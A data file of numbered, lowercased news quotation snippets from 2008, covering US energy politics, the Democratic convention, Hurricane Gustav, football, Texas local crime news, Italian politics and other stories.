8607331 i applaud the presidents announcement today and i am hopeful it will put even more pressure on congress to address the current energy crisis the presidents move is an important step in signaling to the world community that the united states is indeed serious about energy independence make no mistake however congress ultimately has to take action too if the congressional ban is to be lifted so that production along the outer continental shelf can take place georgians continue to tell me that their family budgets are being squeezed due to the price of gasoline and they are rightly furious with the lack of leadership in washington an overwhelming majority of americans support drilling here at home and it is time to put the wheels in motion simply put georgians want us out of this mess and it is my hope that our bipartisan group will be successful in crafting meaningful legislation that both parties can support
8607332 the commission has recognized that more information is necessary to ensure that speculation has not become excessive and i agree with them
8607333 the temporary prohibition of our clients extradition as granted by the echr on 12 august is now effectively lifted and the authorities of the united kingdom are now free to extradite our client to the united states
8607334 in terms of legal challenges and court proceedings weve gone as far as we can
8607335 weve written to the secretary of state asking her to reconsider and keep mckinnon in the country
8607336 weve asked for two weeks to put the medical evidence before her
8607337 when congress tackles issues of such complexity we must make certain that we do not ignore the potential unintended consequences that i believe will result from this approach
8607338 we simply have not had the opportunity to fully explore the possibility that implementation of this legislation could have negative impacts such as driving the price of crude oil up further the real issue is that factual data is lacking in this debate which unfortunately allows everyone to paint the picture convenient for their cause
8607339 i am not opposed to all aspects of this bill rather i believe many of the components designed to yield more transparency in these markets are necessary
8607340 we must ensure that the information both the regulators and congress use to ensure proper oversight is accurate to warrant our actions but this language goes far beyond what i consider reasonable a reasonable market oversight component could be developed as part of a bipartisan comprehensive package but unfortunately this approach is only distracting us from developing more reasonable and balanced legislation
8607341 im pleased this bill supports our men and women in uniform who are deployed in defense of freedom and gives them the resources they deserve and need to accomplish their mission
8607342 our servicemen and women make sacrifices every day so that we can live in the safest most secure nation in the world
8607343 im pleased we were able to provide this funding so that all of our soldiers have the resources and tools they need to complete their missions
8607344 the montgomery g i bill can change lives it has given countless members of our military access to the college education they otherwise would not have been able to afford
8607345 our nations military and their families have sacrificed tremendously so that our nation can live in freedom it is important we modernize education benefits for our military to ensure that our servicemembers veterans and members of the national guard and reserve receive the education benefits they deserve
8607346 this legislation will greatly expand educational benefits available to servicemembers
8607347 i didnt get the raise because the company is tightening the belt
8607348 i didnt get the raise because i didnt prove beyond a reasonable doubt i deserved it
8607349 i got the promotion because it was finally my turn after being here long enough
8607350 i got the promotion because i performed well on that last project
8607351 nobody cares about your personal finances more than you do
8607352 its not just what 10 of us think we can do its also whats going to be possible with the white house and or with the leadership
8607353 it may be minimal but thats ok if it is
8607354 kent we agreed on so much on the farm bill and i gotta believe that there is a lot we agree on energy
8607355 and we started talking about it and there is theres an awful lot and we agreed that there are a lot of democrats and republicans that think like we did
8607356 hopefully we can work something out on a bipartisan basis i will certainly try
8607357 instead of proposing legislation which will just add more to the 68 million unused acres i think we should try something that might be a little better than that
8607358 was to narrowly craft something that could make a difference and appeal to democrats
8607359 who are open to doing something on the production side
8607360 it depends on whether youre interested in leading or whether youre interested in the politics of the issue
8607361 weve had solutions out there that have been blocked by republicans
8607362 the reality is the reality their obstinance and intransigence is going to cost them
8607363 the storm is forecast to hit the u s gulf coast early next week
8607364 a potentially disastrous storm could damage oil and gas production facilities in the region causing very significant supply disruptions
8607365 given the thin trading conditions that are bound to set in over the next two days we could see a rather substantial move higher as both fresh buying and short covering sets in ahead of the long weekend
8607366 we expect various financial risk factors and economic uncertainties to increase putting considerable pressure on the management of our banks operations
8607367 you have to give from the deepest part of yourself and you are going to have to go on giving and the giving is going to have its own reward
8607368 there is nothing in gustavs path that will hinder development
8607369 there is a strong probability that it will be a category 3 storm by the time it enters the gulf and it has the potential to strengthen into a category 4 or 5 storm over the gulf
8607370 we are continuing to monitor this storm as state government agencies including the state police and the louisiana national guard have been put on standby so we are ready to quickly respond if the storm heads our direction
8607371 i have deep respect and appreciation for the civil rights movement
8607372 but far too many of that generation whove been in office far too long have a sense of entitlement and privilege
8607373 this is someone who is completely disengaged from and invisible in the community
8607374 hes never been elected to the school board or even attended a pta meeting he has no idea how these things really work
8607375 as far as mr wilkinson is concerned this is not the end of it there will be officers from thames valley police investigating his financial affairs and he will be left with nothing i hope
8607376 there can be no underestimating the impact of wilkinsons actions
8607377 his conversion of imitation weapons allowed criminals to arm themselves with guns capable of killing and maiming people
8607378 i am thinking about buying an iphone but i have been hearing reports about its unreliability should i be worried should i wait for the problems to be fixed before i purchase an iphone should i not get an iphone at all
8607379 i like the iphone for its touch screen interface and for the fact that i can combine my ipod and my mobile phone into one device i even like that i can use an app like maps occasionally but thats it mainly i want a mobile phone that i can depend on for making and receiving calls without having to jump through hoops or read hundreds of pages of documentation

8607382 there is pressure on my team to do well in the ipl next year because last year we did not get the results we wanted that was in part was down to players coming and going for international duty
8607383 there is a limit with the number of overseas players we can play and a limit to the budget i dont know how much pietersen or flintoff will be available next year with the ashes going on thats a big competition for them
8607384 we need players who can play for us for a longer time and gel with the team not coming and going like that it is a team sport and last year shane warnes side rajasthan won through a team ethic not big names

8607419 da tempo ludc aveva posto lattenzione sulle aree agricole e sul censimento delle stesse
8607420 e stata necessaria la violenza su i due turisti olandesi per capire che a roma sono centinaia le strutture ex agricole abbandonate e occupate da clandestini e da persone senza fissa dimora
8607421 da anni le organizzazioni agricole chiedono di affrontare questo problema continua ciocchetti unidea dare la possibilit ai proprietari di poter farne un utilizzo produttivo cedendo al comune una parte di queste strutture per utilizzi sociali
8607422 nel programma presentato durante la campagna elettorale per sindaco tutto questo era stato menzionato e affrontato
8607423 la nostra condotta politica oggi di un partito di opposizione ma si contraddistingue per la seriet e la coerenza verso i nostri elettori
8607424 grazie al loro impegno alla dedizione dei giovani ed alla certezza delle posizioni tenute dal partito
8607425 che lunione di centro ha potuto riscuoter consensi senza rimaner schiacciata fra le due grandi coalizioni elettorali pdl lega e pd idv mantenendo quindi una significativa rappresentanza parlamentare la nostra condotta politica oggi di un partito di opposizione ma si contraddistingue per la seriet e la coerenza verso i nostri elettori siamo consci che nel periodo in cui viviamo i veti pregiudiziali e lostruzionismo allazione di governo siano deleteri per un paese che cerca di risollevarsi testimonianza ne la presenza in aula dei nostri parlamentari a garanzia del numero legale per un corretto svolgimento dei lavori di contro votar a scatola chiusa i disegni di legge presentati significherebbe allinearsi su posizioni che non ci appartengono e sulle quali nutriamo forti perplessit
8607426 la scuola ha detto deve rimettere al centro la persona e preparare i ragazzi ad essere cittadini consapevoli dei diritti e dei doveri e conoscitori dei principi costituzionali
8607427 crediamo che alla scuola serva chiarezza ha spiegato il ministro per questo ci sar un ritorno dei voti accompagnati dai giudizi che saranno esplicativi del risultato raggiunto dai ragazzi
8607428 il consiglio dei ministri ha espresso parere favorevole in merito al ritorno al maestro unico per la scuola primaria ha detto il ministro il provvedimento sar contenuto nel piano programmatico per la scuola contenuto nella finanziaria e su cui stiamo lavorando con il ministro tremonti
8607429 vi chiedo di farlo con gli occhi fissi al futuro nello spirito dellunit e con lo scopo della vittoria
8607430 obama dovr ricostruire il sogno americano e restituire allamerica il suo prestigio nel mondo
8607431 tutto quello che ho imparato nei miei otto anni da presidente e tutto il lavoro che ho fatto da allora in america e nel resto del mondo mi hanno convinto che barack luomo giusto per questo lavoro
8607432 sedici anni fa mi avete dato lonore di guidare il nostro partito alla vittoria e guidare la nazione in una nuova era di pace e prosperit insieme abbiamo battuto i repubblicani in una campagna dura nella quale venivo attaccato perch troppo giovane e inesperto per essere il comandante supremo delle forze armate vi ricorda qualcosa nel 1992 non ha funzionato perch noi eravamo dalla parte giusta della storia e non funzioner neppure nel 2008 perch anche obama dalla parte giusta della storia
8607433 quello di sapere ispirare la gente infondere la speranza guidarla verso un orizzonte pi alto ha lintelligenza e la curiosit che non possono mancare in un presidente ha mostrato di avere una chiara comprensione della politica estera delle sfide sul fronte della sicurezza nazionale e una ferma determinazione a rimettere in sesto le nostre forze armate
8607434 il mio candidato non ha vinto ha voluto sottolineare ma sono orgoglioso della sua campagna elettorale e di tutta la gente che lha sostenuta hillary far di tutto per appoggiare obama e cos siamo in due anzi siamo 18 milioni
8607435 voglio che tutti sappiano che sono orgoglioso di avere joe biden e tutta la sua famiglia al mio fianco per riprenderci lamerica
8607436 hillary marted ha conquistato tutti e con bill avete visto cosa accade quando un presidente mette la gente al primo posto ci riprenderemo lamerica perch sono le persone normali a fare cose straordinarie
8607437 avete partecipato a questa campagna solo per me o per lamerica
8607438 altri quatto anni come gli otto che abbiamo gi passato
8607439 sono molto onorata di essere qui stanotte come madre orgogliosa democratica orgogliosa americana orgogliosa e una orgogliosa sostenitrice di barack obama
8607440 non importa se avete votato per me o per barack ha affermato e giunto adesso il momento di essere uniti come un partito unito con uno scopo preciso siamo tutti nella stessa squadra e nessuno pu permettersi di stare ai bordi del campo
8607441 quando barack obama sar alla casa bianca rivitalizzer la nostra economia difender i lavoratori affronter le sfide globali della nostra era ha continuato i democratici sanno come fare queste cose se ben ricordo il presidente clinton lo ha gi fatto e il presidente obama lo far di nuovo
8607442 non abbiamo bisogno di altri quattro anni uguali agli ultimi otto ha scandito non abbiamo bisogno che i posti di lavoro continuino a lasciare lamerica che il debito aumenti le famiglie continuino a perdere le case e ci siano pi privilegi per pochi e meno diritti per molti
8607443 building a biofuels industry puts demands on natural human and community resources while at the same time generating potential returns for investors workers and communities where the industry operates
8607444 this conference is designed to build understanding of the short and long term impacts of those demands and potential returns identify issues that must be addressed and options for the future
8607445 i saw the absolute devastation of the tragic explosion at the imperial sugar facility firsthand from the start of this investigation it has remained my position that it is congresss job to understand fully the fundamental cause of this disaster so we can help prevent future tragedies
8607446 oshas citation that imperial sugar egregiously and willfully violated safety and health standards is a severe charge we will hold a hearing in the senate next week to get all the facts on the table i look forward to hearing imperial sugar explain its position and to the testimony from all of our witnesses
8607447 these are very serious charges and the families of those whose lives were lost and those who were injured as a result deserve answers
8607448 senator isakson and i requested an investigation into this matter and next weeks hearing is critically important as we move forward in the process of determining why this happened and what measures can be taken to ensure that it doesnt happen again
8607449 i am pleased that the air force has taken this step to provide quick access for subcontractors and other parties affected by these projects
8607450 i will continue to work with the air force to help local subcontractors recover their losses in relation to these projects and will work to ensure that the necessary houses are built and available for the airmen at moody air force base
8607451 senator chambliss im fed up with congress ignoring the will of the american people stop playing politics and act on the will of the people weve been demanding that you drill and use our 3 trillion barrels of oil we need other resource avenues that the last three administrations havent addressed stop the partisan politics and pass the will of the people the american people do not want a socialistic society period fix the problem
8607452 senator chambliss please do something about the gas prices im a stay at home mom and with raising the family on one income the price of gas is cutting us short on our needs something needs to be done soon were having to cut corners on a lot of different places in order to afford gas to and from work everything is increasing except wages we both have a college education and drive fuel efficient cars but the money we bring in just isnt stretching far enough
8607453 i believe this effort epitomizes what the united states senate is all about
8607454 nothing gets done in this body without 60 votes and you dont get 60 votes without a true bipartisan effort this has been a cooperative effort on the part of all of 10 members this has not been easy and it has been very difficult at times but the discussion has always taken place in a very professional way even though sometimes its been in a very direct way it is my hope that when we return from the august recess our colleagues in the senate after having just spent time at home with their constituents will come forward to support this effort
8607455 ive said for weeks that america has within its reach every resource necessary to be self sufficient when it comes to energy we just need the political will and the common sense to make it happen
8607456 well when good people sit down with good intentions they come up with good ideas there is no silver bullet when it comes to reducing the cost of energy but senators chambliss and conrad have done an outstanding job leading this group to a number of solutions that i believe can work together to alleviate this crisis
8607457 this critical legislation has been the subject of many negotiations and although the legislation is not perfect i am pleased with the bipartisan nature of this compromise bill

8607460 ive always wanted to be a part of this series and have red sox across my jersey
8607461 its like a playoff game you get 11 runs behind you that made it nice too to win the game
8607462 it was awesome i didnt think i hit it out
8607463 i thought it was just going in the gap i hit it good its exciting its a huge win for us
8607464 we just need everybody to pitch in no ones over there boston trying to be the man
8607465 they know how important it is to get on base and extend the inning and when it counts theyve been getting the big hits its the whole team who came up short tonight
8607466 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8607467 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8607468 will receive 100 000 in unrestricted grant money from the ari to continue pursuing their research into the underlying causes of eye disease

8607471 simon i think what you are saying highlights the issue around
8607472 will receive 100 000 in unrestricted grant money from the ari to continue pursuing their research into the underlying causes of eye disease
8607473 just remember one thing my son no one is bigger than the club the club will be here long after you go us supporters aint mugs well not too many to end if you dont want us and our club aint big enough for you then f ck right off
8607474 were very lucky in the band in that we have two visionaries david and nigel theyre like poets like shelley and byron theyre two distinct types of visionaries its like fire and ice basically i feel my role in the band is to be somewhere in the middle of that kind of like lukewarm water
8607475 can you hear me tommy trinder johnny haynes dodi fayed wolfy smith your boys took a hell of a beating
8607476 each season there is a team that goes into freefall and gets sucked into the relegation scrap losing becomes a habit like winning and if we aint careful that team could be us
8607477 clearly my words have gone to the highest level expect him gone in may
8607478 as a spurs supporter of no half measure i will continue to support jol hughton the squad and the entire club to the best of my ability and at all times
8607479 i hear glenn hoddle has found god that must have been one hell of a pass
8607480 white hart lane was always a place where i felt i belonged
8607481 even now when i go over to my mothers house and dig out the old tracksuit tops i wore it makes the hair stand up on the back of my neck i like to think i am part of a special family i am no longer connected with the club on a daily basis but im delighted with every win and sad about every defeat
8607482 any player coming to spurs whether hes a big signing or just a ground staff boy must be dedicated to the game and to the club he must never be satisfied with his last performance and he must hate losing
8607483 bill did so much for his beloved spurs that we must never let his legacy fade he must be our inspiration as we strive to ensure that a new era dawns here at white hart lane
8607484 oh dear its f cked is what ive always taken it to mean i do have o level latin now theyve stuck up a literal translation in large letters to dare is to do the words just stand there on their own not making much sense
8607485 when gazza came to the spurs training ground for the first time got the ball went round 8 players as if they were not there and then smashed the ball into the net just to see him play like that made the hair stand up on the back of your neck everybody stood there and applauded him
8607486 we will not be pushed around by a bunch of north london yobbos
8607487 the worst thing spurs ever did was get rid of keith burkinshaw they never replaced him
8607488 when youve finished playing football young man which is going to be very soon i feel youll make a very good security guard
8607489 if someone wants to give you a bum steer on who were after then so be it if you want to know ask me because i have a list of players we want and robbie keane isnt on it
8607490 the biggest regret of my whole football career was leaving white hart lane in 1970 my interest in football weakened after that i was heartbroken
8607491 i know more about smalz herring than i do about football
8607492 the trouble with christian gross is that no one had heard of him the communication wasnt brilliant and as captain i decided to explain to him how things worked and what the players liked and were used to i do not believe he listened to a word i said
8607493 always had a bit of time make a little bit of space look up bang and you know he could put it on a postage stamp from 40 yards mmmmmmmmm
8607494 the great fallacy is that the game is first and last about winning its nothing of the kind the game is about glory its about doing things in style with a flourish about going out and beating the other lot not waiting for them to die of boredom
8607495 i was sitting just a few feet away from david pleat at the world cup hes a nice fellow but the man is mad certifiably eye spiningly mad
8607496 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8607497 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8607498 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8607499 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8607500 today we use hp dl580 g5 to handle larger server workloads

8607597 social security is and has always been an important program and many seniors in georgia and across the nation depend on this vital program
8607598 currently nearly 48 million americans are receiving some form of social security benefit we must ensure that this program continues to provide benefits to the working americans that deserve what they have earned today americans have been using this program to aid in their retirement for 73 years many have benefited and it is my goal that many will continue to have access to this program as we in congress work to ensure that it remains solvent i would like to take this opportunity to renew our commitment to making sure this program is around for many years to come

8607609 the animating principle of my faith as taught to me by church and home was that the cardinal sin was abuse of power
8607610 it was not only required as a good catholic to abhor and avoid abuse of power but to do something to end that abuse
8607611 i get comfort from carrying my rosary going to mass every sunday its my time alone
8607612 there are elements within the church who say that if you are at odds with any of the teachings of the church you are at odds with the church i think the church is bigger than that

8607622 senator john mccain had an issue the republicans could embarrass democratic presidential candidate barack obama with and perhaps ride to victory because the mass majority of the american people want to do the opposite of what the democrats do so nobody can figure out why compromise with the democrats and cut the knees off of senator mccain

8607625 i am pleased to announce this funding for the university of georgia
8607626 with the increased development of cellulosic biofuels we are getting one step closer to gaining energy independence from foreign sources for oil this announcement is also a great boost for georgia as a leader in the development of alternative fuels i thank the doe and the usda for recognizing the tremendous potential of cellulosic biofuels to produce clean and efficient fuel
8607627 i believe we must take significant steps to reduce our dependence on foreign oil and one of the best long term solutions is the investment we are making in the production of cellulosic biofuels
8607628 georgia has 24 million acres of commercial forest and these forests contain tons of cellulosic biomass in the form of wood debris paper pulp and grass fuel this is exceptional news for the university of georgia and for the entire state

8607632 weve seen prices start falling weve seen the price for a barrel of oil decrease by about 20 percent since the president made his statement since we came out with our proposal
8607633 i think thats great he should just continue to go forward with it and hopefully make progress with it and bring the prices on down

8607745 a lot of people say well what do you actors need why are you speaking up youre not people who need anything and its true were very blessed but almost all of us come from real middle class families and because we have the platform that we do it makes it a little bit easier for us to speak up speak out but everyone should really be doing it mostly im just here because im a bleeding heart liberal and a concerned citizen and i cant wait to hear the speeches every election is historic but this one is particularly so and so im so excited to be here
8607746 i dont feel very good about the last eight years and i feel like were in a place where we really need theres a lot of damage that we need to recover from and we need a very strong and inspirational leader to bring us out of this its pretty grim
8607747 i did support hillary rodham clinton in the new york primary because ive been an admirer of hillarys for a long time shes been an excellent senator and of course i was slightly biased by the fact that she was a woman i never thought that in my lifetime i would have the pleasure of voting for a woman for president so i did vote for her in the primary but i always admired barack obama and when it became time for hillary to step aside and for obama to become the nominee i was very pleased to be able to support him and i prayed that he would pick joe biden for his vice president i thought that was the best possible choice
8607748 one of the benefits and pleasures of being an actor is having the opportunity to travel around the united states to travel overseas i began traveling to europe and asia when i was about 20 and the respect that our country had the regard that our country had throughout the world was so tremendous the embrace that youd receive just for being an american was extraordinary and over the last eight years during my travels ive seen that love for our country become so compromised that i dont know how well ever regain our stature in the world
8607749 if you go overseas you see how much theres an excitement that a country that the rest of the world felt got so lost suddenly is on track enough to make a change this dramatic not only an african american but a man whose name is barack obama theres so many different elements of it that suddenly make i think the rest of the world feel like hey maybe theyre not as insane as we think they are and that to me is primarily what i keep seeing

8607797 the vehicle was traveling north on 1862 on the west end of the county when it missed the intersection on fm 616
8607798 the vehicle proceeded across the ditch and landed up on the railroad tracks
8607799 as he got to the 1862 intersection he noticed the car up on the tracks and having just passed the train he knew trouble was coming fast
8607800 at the same time the railroad engineer had observed the vehicle on the tracks and went into emergency breaking and started to blow the whistle
8607801 the injured man said he could not get out so kopaz reached in grabbed him and helped him out
8607802 he immediately stumbled so the trooper reached in and put his arms under him and drug him off the railroad tracks
8607803 they went about 18 feet he had to lay him down on the ground he covered him up with his body just as the train hit the car it was that close the car was taken 1 500 feet down the tracks before it came to a stop

8607805 as you all know this will be my last 100 club award banquet to serve in this capacity and i want to tell everyone that it has been an extreme honor
8607806 one of the greatest honors i think that can be bestowed upon an individual in addition to being a peace officer is serving as a texas sheriff
8607807 the reason i am so proud is because i have had the opportunity to work with this group of men and women of the matagorda county sheriffs office
8607808 i cant say enough about them it has been my distinct honor to work with each of you
8607809 the reason why i chose this person is because every time i needed help at the crisis center i could always pick the phone up and call this person and he would always call me right back and help me with whatever i needed help with

8607815 as you approach texas 60 between 12th street and adams look both ways
8607816 if you see the newly installed beacons on the backside of the school assemblies flashing the school speed limit is 20 mph
8607817 we will have extra patrol out on the streets next week mainly to remind the public that school is starting and we need to look out for the safety of the children
8607818 after he beat her and threatened her with a gun he walked to his car aimed his gun into the air and fired it once as an exclamation point
8607819 we also have a forecast of rain this week its supposed to be a wet week
8607820 we would ask residents to please be careful as they start burning
8607821 there is still a lot of dry grass and fuel on the ground that could cause a fire hazard so do be cautious as you burn
8607822 since stp is a complicated partnership we needed to make sure with the texas governors office that we were nominating the proper entity

8607828 its almost unheard of to be able to recover every single stolen item except for cases of beer and some food in something like this
8607829 sgt kurtis brown investigator responsible for recovering stolen property and identifying the suspects went outside the box and really gave an extra effort to make this happen
8607830 once those patrol officers were able to give brown some information they obtained during that traffic stop he ran with it
8607831 we located the 19 year old man and he is turning himself in today
8607832 we still have not located the other suspect and we hope we can get the public to help us out with that
8607833 burglars scout areas and target the places that are most vulnerable
8607834 during one of the suspect interviews they revealed different areas in the county that they planned to burglarize
8607835 they told me that the only thing that would have stopped them is if they got caught
8607836 we really want to commend kurtis brown on everything hes done to help solve this case so quickly and completely
8607837 when ramadan comes the gates of the garden are opened the gates of the fire are closed and the shaytans are chained up

8607847 there are no known suspects but there are some persons of interest

8608086 therefore its conservative guidance of flat to up 3 sequentially shouldnt have been a big surprise nor a cause for concern as a matter of fact with its minimal exposure to pc and consumer markets i think flat to up 3 is pretty good
8608087 what wall street would be better to focus on are the operational improvements adi has made in its july quarter adi improved its pro forma operating margin to 26 5 from 26 2 last quarter and again reduced its inventory which sits now at the lowest level weve seen since 2004
8608088 if we look back at last year and include the results from divested businesses its operating margin was only 22 8
8608089 in addition to this adi has nearly replaced all of the low margin revenues from divested businesses with higher margin revenues including divested businesses in the july 2007 quarter adi reported revenues of 680 3m
8608090 excluding those businesses in the july 2008 quarter adi reported sales of 659m a very modest 3 decline however when we look at pro forma gross profit dollars adi generated 403 7m in the july quarter this year versus 391 1m last year if this is bad i want more bad
8608091 in my prior review of the stock i wrote that it was time to hold off on accumulating shares of adi due to the price appreciation we had seen from buy recommendations made earlier in 2008
8608092 they are going to have a lot of cash they can buy at least 10 of the stock and probably do a special dividend to shareholders

8608102 scientists have known for years yams contain high amounts of steroidal glycosides which are naturally occurring steroid alkaloids
8608103 the problem for scientists is that we could never liberate all those powerful steroid alkaloids and make them usable until now
8608104 we just got finished with a clinical trial study on naturally occurring steroidal glycosides and the results were staggering
8608105 what we were able to do is cleave the sugar molecule off the steroidal glycoside and liberate its enormous nitrogen retaining effect
8608106 and as everybody knows steroids dramatically increase nitrogen in the muscle cell making it bigger stronger and faster
8608107 im using it on some of my pro ball players and theyre getting huge steroid like results with no steroid side effects some of them are getting so big and strong their agents have phoned me swearing up and down im giving them real juice i had one young player who gained 13 pounds of muscle in 30 days and lowered his 60 yard dash time by 3 seconds

8608116 in terms of legal challenges and court proceedings weve gone as far as we can
8608117 weve written to the secretary of state asking her to reconsider and keep mckinnon in the country

8608120 why should we give the syrians a pretext to intervene like in 76 when some christian villages were surrounded and the christians went to damascus and asked for syrian protection it could happen again now with the alawites
8608121 they feel like a minority and they know they could be protected
8608122 it has to be worked out step by step in every area in every quarter of beirut in every village in the media
8608123 weve got to live together we fixed up a joint security committee that is working on the ground

8608129 ramadan is approaching in a few days everyone expects a generous feast at sehri the pre dawn meal that starts the fast and at iftar when the fast ends at sunset and i just do not know how to manage
8608130 consumption increases in most households during ramadan everyone spends more
8608131 many buy almost double the usual amount of rice and flour
8608132 sometimes even at the sunday bazaars set up by the government to provide items at controlled rates to people you have to stand for hours to buy a single 20kg bag of flour
8608133 atta wheat flour will be sold at a fixed price of rs 300 about 4 per 20kg bag in ramadan
8608134 lift the illegal ban on inter provincial movement of wheat
8608135 we usually do a roaring business in ramadan but now we are suffering losses because few can afford to buy one roti at rs 7 about nine us cents a piece it cost only rs 5 6 5 us cents a few months ago
8608136 no one is doing anything for us and we fear the time may come when we must remove our children from school if we are to eat
8608137 barack obama is ready to lead america and restore american leadership in the world

8608141 republicans said i was too young and too inexperienced to be commander in chief
8608142 they actually want us to reward them for the last eight years by giving them four more

8608144 i can barely make 1 200 kyat 1 per day out of my livestock business now before the cyclone i could make over 5 000 kyat 5 per day
8608145 those ducks are not mine they belong to my friend
8608146 we also have a plan to help the poor farmers in terms of backyard livestock
8608147 provided we receive funds from our donors we will implement our plan to distribute livestock animals like chickens and pigs to the poor cyclone hit farmers
8608148 were going to hand over those livestock animals via the township authorities i hope this will help the cyclone survivors to restore their livestock quickly
8608149 it will take 2 3 years for the farmers to restore their backyard livestock

8608160 i know sir alex but i havent played against him so i am looking forward to the game which i know will be very difficult

8608178 hes won twice this year his form has been very good in recent weeks and hes played on five ryder cups and had four winning teams and hes a natural partner to lee westwood
8608179 if you had everybody picking i think clarke would be a lock but obviously nick could see different reasons but if i was picking id be picking darren
8608180 darren carries stature into the ryder cup which is very important when you tee it up on the first tee you want your opposition standing there and feeling that theyre coming up against somebody who has a bit of stature darren has that and monty has that too
8608181 the guy montgomerie has played eight ryder cups has never lost a singles match and hes due a consideration
8608182 my opinion is that until he loses a singles match maybe he should be given a chance
8608183 it could all change this week two months ago you would have picked monty paul casey has had a very solid two months and two months ago ian poulter finished second at the open
8608184 youve got four players playing for two spots all four have a case for being picked its going to be tough and two guys are going to be unhappy

8608189 this is a mistake made by him not intentional there was no intent to do harm
8608190 he gets a letter to the bbo and u s district court that all this happened and that i am satisfied with the discipline and they are free to do whatever they want
8608191 this means there will be at least some recognition of the harm they have suffered and they have the attention of the court to do the right things by them
8608192 i never gave him a license or a signature or anything
8608193 i dont think patuxent will help him he already took someones life
8608194 its been traumatic i never thought i could hurt like this
8608195 hes a good kid hes been through a lot ronald has i guess two sides to him
8608196 i wish i could have done something im so sorry
8608197 he was not faking it elliot atkins a clinical psychologist with practices in new
8608198 he was very much against having a mental health evaluation very much upset if he would be found to be mentally ill atkins testified being questioned by miraglias attorney joseph krakora
8608199 his whole focus was getting his day in court so he could be revealed to the jury as the son of god atkins testified
8608200 i am the son of god the judgment day is going to be soon atkins testified

8608207 upon errant misguided and ill conceived advice and recommendation of his court appointed counsel william e johnson esquire
8608208 ben fawley i dont think ever had a fair trial
8608209 its on tape with him saying yes that he understood what was going on
8608210 which is so disgraceful because its trying to put taylor on trial
8608211 sickening to my stomach how dare him do this the fact is he changed his version of what happened that night at least three times
8608212 we have changed our tactics in this case for a variety of very good reasons which i will explain later
8608213 we had a case a 16 year old male student at washington and lee
8608214 some of the people attending particularly their wives were astounded
8608215 patients that die with that bag over their head dont struggle and carry on
8608216 for him to say it was consensual is crap fawley used duct tape to bind her hands my understanding to strangle someone it isnt a quick death it would have taken minutes not two minutes maybe five minutes
8608217 the negative side effects that he quotes in his motion are only during the first few months
8608218 her prescriptions were for depression she was not bipolar her doctors would dispute that adamantly
8608219 its not unheard of for this drug to be in the brain of people who self destruct
8608220 according to ben she insisted on keeping this bag over her head
8608221 johnsons public comments about this case raise serious questions about whether he was grossly negligent and ineffective as fawleys counsel or whether instead he deliberately suppressed evidence that could have exonerated his client
8608222 commented regarding his success in convincing fawley to plead guilty
8608223 whats funny is he had two lawyers and one of them christopher collins is well known well respected and one of the best defense attorneys not only there but in the state he is not mentioned in fishers pleadings which is interesting
8608224 i was told by legal counsel who has seen the pleadings that the motion is fraught with error there is nothing in it worth hearing and it is just an abuse of the legal system
8608225 there is nothing in here thats new evidence which is one of the requirements for this to be heard i believe in my heart that it will not go anywhere

8608229 i was thinking about how little we look around ourselves in day to day life i grew up in the country and loved playing outside when i was a kid digging things up and finding bugs there isn t much chance to do that in the city and as an adult you lose that sense of wonder about what is around you i wanted to introduce a bit of mystery and encourage people to look around themselves a bit more and of course the notion of being small in a big city is quite emotive everyone who lives in the city feels lost and lonely from time to time

8608241 these visions empower nonviolent resistance to oppression enabling gods people to continue to refute the finality and divinity of the empires they suggest not that the kingdom of god is merely a more powerful or more successful version of the imperial powers but that it is an altogether different kind of rule the tragic irony of christian history has been that so often christian empires have taken over the symbol of the kingdom of god to justify the same kind of rule as that of the empires it was forged to oppose

8608248 the economics are counter intuitive temporarily restrict supply to increase uptake
8608249 this is not what we wanted to find but it has been our solid experience over two years and is a known paradox in economics
8608250 given that wikileaks needs to restrict supply for a period to increase perceived value to the point that journalists will invest time to produce quality stories the question arises as to which method should be employed to apportion material to those who are most likely to invest in it

8608389 there are lots of other different financial education programmes being offered in schools workplaces and online but as fsa research highlighted last month there is little or no evidence to suggest it is improving peoples financial capability

8608392 after all its in no ones interest if homeowners cant keep up with their repayments because lets not forget banks lose out too if mortgages are not repaid
8608393 a more solid tone to the global economy and a weak dollar will help bolster exports but it is doubtful this will be enough to prevent overall economic growth from declining these headwinds are clouding what is already a pretty bleak outlook

8608400 these data are the first to suggest that there is a clinically significant increase in bone fractures among hiv infected patients using data from a large healthcare system
8608401 hiv patients with risk for low bone density should be assessed and potentially treated to prevent fractures

8608415 its a great opportunity for me to get back playing football at a high standard with a club who have ambitions to move forward
8608416 its a chance for me to get fit match fit that is and to play regular football
8608417 i havent had offers yet but ive had texts from frank warren and tony sims from hennessy sports
8608418 if terry stays and they aba come with a decent offer well london 2012 thats me
8608419 but obviously im going to have to sit down and speak to terry and whoever else
8608420 but if they deliver and bring some decent dough actually its not even about the dough im an olympic champion ive made history the first gold medallist in 50 years so a bit more respect and a bit more dough would help
8608421 im going down in history with the likes of muhammad ali and oscar de la hoya its amazing
8608422 unfortunately for derek it looks like he will be at celtic beyond the transfer window as the club are not receptive to loan deals and thats all thats been offered at the moment
8608423 he was unsatisfied with his performance and i think this is normal
8608424 he must accept you have opponents on the field and not every day is your best day but you cannot lose your face we will talk today you have some rules and we cant accept this
8608425 this is an area we must look at we have a lot of options open and a lot of possibilities at the moment

8608433 thanks to investments totaling 600 million euros 887 million in 2007 and 2008 at the end of 2008 we will be supplying 96 percent of all households with dsl

8608437 they checked my car and told me they found that
8608438 they wanted to deport me but i fought and they found me to be innocent
8608439 if they had done the minimum amount of inspection for this vehicle they would have easily found the marijuana inside the tire and my clients life would not have been ruined

8608442 whoever sheds the blood of man by man shall his blood be shed for god made man in his own image
8608443 just as we have borne the image of the man of dust we shall also bear the image of the man of heaven
8608444 the image of the invisible god the firstborn of all creation
8608445 he is the radiance of the glory of god and the exact imprint of his nature and he upholds the universe by the word of his power
8608446 the word became flesh and dwelt among us and we have seen his glory glory as of the only son from the father full of grace and truth
